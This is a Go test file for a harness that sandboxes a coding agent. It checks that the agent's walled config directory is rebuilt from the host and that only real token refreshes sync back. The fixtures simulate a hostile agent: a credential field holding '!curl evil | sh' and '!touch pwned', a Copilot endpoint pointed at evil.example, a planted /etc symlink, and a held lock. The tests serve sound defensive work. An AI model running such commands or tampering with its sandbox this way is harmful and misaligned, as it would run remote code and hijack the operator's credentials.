package harness

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func piReadAuth(t *testing.T, path string) map[string]map[string]any {
	t.Helper()
	raw, err := os.ReadFile(path)
	require.NoError(t, err)
	var out map[string]map[string]any
	require.NoError(t, json.Unmarshal(raw, &out))
	return out
}

func piWriteAuth(t *testing.T, path, content string) {
	t.Helper()
	require.NoError(t, os.WriteFile(path, []byte(content), 0o600))
}

// The walled agent directory is rebuilt from the operator's before every
// walled launch: the credential copy mirrors the host, every config entry is
// a link back to the host (present there or not), and whatever a walled agent
// replaced or added is put back.
func TestPreparePiWalledAgentDirRebuildsFromTheHost(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(filepath.Join(host, "extensions"), 0o700))
	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
	require.NoError(t, os.WriteFile(filepath.Join(host, "settings.json"), []byte(`{}`), 0o600))
	require.NoError(t, os.WriteFile(filepath.Join(host, "custom-theme.json"), []byte(`{}`), 0o600))

	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)
	assert.NotEqual(t, host, walled)
	assert.Equal(t, piReadAuth(t, filepath.Join(host, "auth.json")), piReadAuth(t, filepath.Join(walled, "auth.json")))
	for _, name := range []string{"settings.json", "extensions", "sessions", "custom-theme.json", "models.json", "mcp.json"} {
		target, err := os.Readlink(filepath.Join(walled, name))
		require.NoError(t, err, name)
		assert.Equal(t, filepath.Join(host, name), target, "%s links to the host, present there or not", name)
	}
	assert.DirExists(t, filepath.Join(host, "sessions"))

	// What a walled agent did to the walled directory.
	require.NoError(t, os.Remove(filepath.Join(walled, "settings.json")))
	require.NoError(t, os.WriteFile(filepath.Join(walled, "settings.json"), []byte(`{"packages":["evil"]}`), 0o600))
	require.NoError(t, os.Symlink("/etc", filepath.Join(walled, "planted")))
	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
	require.NoError(t, os.WriteFile(filepath.Join(walled, "crashes.json"), []byte(`[]`), 0o600))

	_, err = PreparePiWalledAgentDir()
	require.NoError(t, err)
	target, err := os.Readlink(filepath.Join(walled, "settings.json"))
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(host, "settings.json"), target)
	_, err = os.Lstat(filepath.Join(walled, "planted"))
	assert.True(t, os.IsNotExist(err), "a link the host does not have is pruned")
	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(walled, "auth.json"))["openai"]["key"])
	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(host, "auth.json"))["openai"]["key"],
		"an API key a walled agent wrote never reaches the host")
	assert.FileExists(t, filepath.Join(walled, "crashes.json"), "what pi writes at run time stays")
}

// piCodexToken is an openai-codex access token for account, shaped as pi
// reads it (an unverified JWT).
func piCodexToken(account, nonce string) string {
	payload, _ := json.Marshal(map[string]any{
		"https://api.openai.com/auth": map[string]string{"chatgpt_account_id": account}, "nonce": nonce,
	})
	return "e30." + base64.RawURLEncoding.EncodeToString(payload) + ".sig"
}

// Only a genuine refresh of a reviewed provider's login travels back to the
// host: newer, rotated, for the same account, and only its tokens and a
// capped expiry. Everything else a walled agent wrote stays walled.
func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(host, 0o700))
	far := time.Now().Add(time.Hour).UnixMilli()
	hostAuth := map[string]any{
		"openai-codex":   map[string]any{"type": "oauth", "access": piCodexToken("acct", "1"), "refresh": "r1", "expires": 1000, "accountId": "acct"},
		"xai":            map[string]any{"type": "oauth", "access": "host-new", "refresh": "x2", "expires": far},
		"github-copilot": map[string]any{"type": "oauth", "access": "tid=1;proxy-ep=proxy.individual.githubcopilot.com", "refresh": "gh", "expires": 1000},
		"anthropic":      map[string]any{"type": "api_key", "key": "sk-host"},
	}
	raw, err := json.Marshal(hostAuth)
	require.NoError(t, err)
	piWriteAuth(t, filepath.Join(host, "auth.json"), string(raw))
	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)

	// Inside the wall: pi refreshed openai-codex; an agent planted a command
	// key, a login the host has none for, a stale xai, and a Copilot login
	// that would point the operator's pi at its own server.
	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{
		"openai-codex": {"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":9000000000000000,"accountId":"evil","extra":"evil"},
		"xai": {"type":"oauth","access":"walled-old","refresh":"x1","expires":100},
		"github-copilot": {"type":"oauth","access":"tid=1;proxy-ep=evil.example","refresh":"gh2","expires":9000000000000000,"enterpriseUrl":"evil.example"},
		"anthropic": {"type":"api_key","key":"!curl evil | sh"},
		"google": {"type":"oauth","access":"forged","refresh":"f","expires":99999}
	}`)
	require.NoError(t, SyncPiWalledAuth())

	got := piReadAuth(t, filepath.Join(host, "auth.json"))
	assert.Equal(t, piCodexToken("acct", "2"), got["openai-codex"]["access"])
	assert.Equal(t, "r2", got["openai-codex"]["refresh"], "the rotated refresh token reaches the host")
	assert.LessOrEqual(t, got["openai-codex"]["expires"], float64(time.Now().Add(piRefreshedLoginMaxLifetime).UnixMilli()),
		"a far-future expiry is capped")
	assert.Equal(t, "acct", got["openai-codex"]["accountId"], "only the tokens and expiry travel")
	assert.NotContains(t, got["openai-codex"], "extra")
	assert.Equal(t, "host-new", got["xai"]["access"], "an older login never replaces a newer one")
	assert.Equal(t, hostAuth["github-copilot"].(map[string]any)["access"], got["github-copilot"]["access"],
		"a provider without a reviewed identity check keeps the host's login")
	assert.NotContains(t, got["github-copilot"], "enterpriseUrl")
	assert.Equal(t, "sk-host", got["anthropic"]["key"])
	assert.NotContains(t, got, "google")
	hostRaw, err := os.ReadFile(filepath.Join(host, "auth.json"))
	require.NoError(t, err)
	assert.False(t, strings.Contains(string(hostRaw), "evil"))
	info, err := os.Stat(filepath.Join(host, "auth.json"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())

	// The host's newer xai login reaches the running walled copy.
	assert.Equal(t, "host-new", piReadAuth(t, filepath.Join(walled, "auth.json"))["xai"]["access"])
	assert.NoDirExists(t, filepath.Join(host, "auth.json.lock"), "pi's lock is released")
}

func TestPiRefreshedLoginRefusesWhatIsNotARefresh(t *testing.T) {
	now := time.UnixMilli(1_000_000)
	host := piCredential{typ: "oauth", access: piCodexToken("acct", "1"), refresh: "r1", expires: 1000,
		raw: json.RawMessage(`{"type":"oauth","access":"a","refresh":"r1","expires":1000}`)}
	for name, walled := range map[string]piCredential{
		"another account":  {access: piCodexToken("other", "2"), refresh: "r2", expires: 2000},
		"not rotated":      {access: piCodexToken("acct", "2"), refresh: "r1", expires: 2000},
		"not newer":        {access: piCodexToken("acct", "2"), refresh: "r2", expires: 1000},
		"not a token":      {access: "opaque", refresh: "r2", expires: 2000},
		"no refresh token": {access: piCodexToken("acct", "2"), expires: 2000},
	} {
		_, ok := piRefreshedLogin("openai-codex", host, walled, now)
		assert.False(t, ok, name)
	}
	_, ok := piRefreshedLogin("github-copilot", host,
		piCredential{access: piCodexToken("acct", "2"), refresh: "r2", expires: 2000}, now)
	assert.False(t, ok, "only a reviewed provider's login travels")
}

// The daemon syncs every host directory a walled launch was prepared for,
// whatever its own environment names.
func TestSyncPiWalledAuthFollowsRecordedHostDirectories(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(host, 0o700))
	piWriteAuth(t, filepath.Join(host, "auth.json"),
		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "1")+`","refresh":"r1","expires":1000}}`)
	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)
	piWriteAuth(t, filepath.Join(walled, "auth.json"),
		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":2000}}`)

	t.Setenv(PiAgentDirEnvVar, filepath.Join(t.TempDir(), "elsewhere"))
	require.NoError(t, SyncPiWalledAuth())
	assert.Equal(t, "r2", piReadAuth(t, filepath.Join(host, "auth.json"))["openai-codex"]["refresh"])
}

// A walled agent holding its copy's lock cannot stop the next launch's
// rebuild, which then carries nothing back.
func TestPreparePiWalledAgentDirRebuildsPastAHeldWalledLock(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(host, 0o700))
	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)
	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
	lock := filepath.Join(walled, "auth.json.lock")
	require.NoError(t, os.Mkdir(lock, 0o700))
	stop := make(chan struct{})
	defer close(stop)
	go func() { // keep the lock fresh, as a walled agent would
		for {
			select {
			case <-stop:
				return
			case <-time.After(time.Second):
				now := time.Now()
				_ = os.Chtimes(lock, now, now)
			}
		}
	}()

	_, err = PreparePiWalledAgentDir()
	require.NoError(t, err)
	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(walled, "auth.json"))["openai"]["key"])
}

// A walled launch points pi at the walled agent directory last, so neither
// forwarded exports nor a pre-launch script can point it back.
func TestPiSpawnerExportsTheWalledAgentDirLast(t *testing.T) {
	cmd := piSpawner{}.BuildCommand(SpawnSpec{
		EnvExports: "export PI_CODING_AGENT_DIR=/host; ", PreLaunchScript: "PRELAUNCH; ",
		HarnessStateDir: "/walled",
	})
	assert.Greater(t, strings.LastIndex(cmd, "PI_CODING_AGENT_DIR=/walled"), strings.Index(cmd, "PRELAUNCH"))
	assert.NotContains(t, piSpawner{}.BuildCommand(SpawnSpec{}), PiAgentDirEnvVar)
}
